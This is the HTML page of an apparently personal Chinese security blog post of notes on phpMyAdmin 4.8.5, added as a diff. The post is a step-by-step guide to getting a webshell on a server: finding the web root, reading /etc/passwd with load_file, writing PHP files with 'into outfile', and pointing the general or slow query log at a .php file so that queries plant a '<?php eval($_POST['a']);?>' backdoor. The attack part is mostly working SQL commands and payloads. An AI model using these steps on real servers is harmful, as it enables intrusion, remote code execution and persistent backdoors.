@@ -1,0 +1,290 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>xssong17</title>
+<meta name="description" content="我等着，等着你" />
+<link rel="shortcut icon" href="https://xssong17.github.io/favicon.ico?v=1704635108417">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://xssong17.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://xssong17.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://xssong17.github.io/images/avatar.png?v=1704635108417" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">xssong17</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            文章目录
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#%E5%B8%B8%E8%A7%84getshell">常规getshell</a></li>
+<li><a href="#%E6%97%A5%E5%BF%97getshell">日志getshell</a>
+<ul>
+<li><a href="#%E5%86%99%E5%85%A5%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell">写入日志文件getshell</a></li>
+<li><a href="#%E6%85%A2%E6%9F%A5%E8%AF%A2%E5%86%99%E5%85%A5webshell">慢查询写入webshell</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.2s">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.4s">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://xssong17.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">phpMyAdmin随记</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2021-04-29 / 3 min read
+        </div>
+        
+        <div class="post-content yue">
+          <p>版本：phpMyAdmin4.8.5</p>
+<p>查阅版本信息：</p>
+<p>http://localhost/phpMyAdmin4.8.5/README<br>
+http://localhost/phpMyAdmin4.8.5/changelog.php</p>
+<h1 id="常规getshell">常规getshell</h1>
+<p>1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
+2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
+<p>查找物理路径</p>
+<p>phpinfo.php</p>
+<pre><code>select @@basedir;
+</code></pre>
+<pre><code>web绝对路径：在可读写的前提下如何获取web路径？
+
+(1) phpinfo() 页面：最理想的情况，直接显示web路径
+
+(2) web报错信息：可以通过各种fuzz尝试让目标报错，也有可能爆出绝对路径
+
+(3) 一些集成的web框架：如果目标站点是利用phpstudy、LAMPP等之类搭建的，可以通过查看数据库路径show variables like '%datadir%'; ，再猜解web路径的方法，一般容易成功。
+
+(4) 利用select load_file() 读取文件找到web路径：可以尝试/etc/passwd，apache|nginx|httpd log之类的文件。
+
+Trick：如何判断目录是否存在，往往确定了/var/www/html目录，但是还有一层目录不能确定，可以采用目标域名+常用的网站根目录的方式进行爆破，当使用select 'test' into outfile '/var/www/$fuzz$/shell.php';时目录$fuzz$不存在将会报错Can't create/write to file '/var/www/html/.666.txt' (Errcode: 2)；如果存在但是目录写不进去将返回(Errcode: 13)；如果使用的load data infile &quot;/etc/passwd&quot; into table test;该语句执行后将也会显示文件是否存在，有权限能否写等信息。
+
+</code></pre>
+<p>查看写入权限</p>
+<pre><code>show variables like '%secure%'
+</code></pre>
+<pre><code>select 'test' into outfile '/var/www/webxxx/shell.php'
+</code></pre>
+<h1 id="日志getshell">日志getshell</h1>
+<h2 id="写入日志文件getshell">写入日志文件getshell</h2>
+<p>查看日志设置</p>
+<pre><code>show variables like 'general_log%'
+</code></pre>
+<pre><code>第一步手动开启日志。
+set global  general_log='on'   //首先设置为on
+第二步 修改日志路径
+set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
+然后 查看是否开启成功
+show variables like &quot;general_log%&quot;
+</code></pre>
+<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
+select '&lt;?php eval($_POST['a']);?&gt;'
+虽然报错但已经写进去了
+</code></pre>
+<h2 id="慢查询写入webshell">慢查询写入webshell</h2>
+<p>查询配置</p>
+<pre><code>show variables like '%slow%';
+</code></pre>
+<p>配置路径</p>
+<pre><code>set GLOBAL slow_query_log_file='C:/phpStudy/PHPTutorial/WWW/slow.php';
+</code></pre>
+<p>开启</p>
+<pre><code>set GLOBAL slow_query_log=on;
+</code></pre>
+<p>写入日志</p>
+<pre><code>select '&lt;?php phpinfo();?&gt;' from mysql.db where sleep(10);
+</code></pre>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
+
+        </div>
+
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://xssong17.github.io/post/xin-xi-shou-ji/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  信息收集
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://xssong17.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/">
+                <h3 class="post-title">
+                  phpinfo中值得注意的点
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+
+      </div>
+    </div>
+
+    <script src="https://xssong17.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
